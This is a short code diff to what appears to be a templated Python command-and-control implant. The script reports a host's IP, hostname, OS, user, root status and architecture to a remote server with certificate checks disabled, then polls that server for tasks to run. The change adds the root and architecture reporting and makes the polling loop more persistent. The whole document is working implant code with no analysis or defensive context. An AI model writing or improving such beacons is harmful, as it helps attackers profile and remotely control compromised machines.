@@ -38,15 +38,19 @@ data = {
     "address": socket.gethostbyname(socket.gethostname()),
     "hostname": sp.getoutput("hostname"),
     "os": sp.getoutput("uname").lower(),
-    "user": sp.getoutput("whoami")
+    "user": sp.getoutput("whoami"),
+    "admin": os.getuid() == 0,
+    "architecture": sp.getoutput("uname -m"),
 }
 name = r.post(f"{URL}/connect", json=data, verify=False).text
 
-for _ in range({{timeout}}):
+i = 0
+while i < {{timeout}}:
     time.sleep({{sleep_time}})
     try:
         tasks = r.get(URL + "/tasks/" + name, verify=False)
     except:
+        i += 1
         continue
     tasks = tasks.json()
     for task in tasks:
